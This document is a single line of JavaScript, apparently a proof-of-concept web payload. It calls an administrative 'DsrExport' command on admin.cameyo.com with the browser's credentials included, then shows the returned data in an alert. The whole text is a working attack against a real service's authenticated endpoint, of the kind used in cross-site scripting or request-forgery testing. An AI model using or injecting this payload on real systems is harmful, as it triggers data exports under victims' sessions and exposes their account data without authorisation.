fetch("//admin.cameyo.com/command?op=DsrExport",{credentials:"include"}).then(r=>r.text()).then(alert).catch(alert);
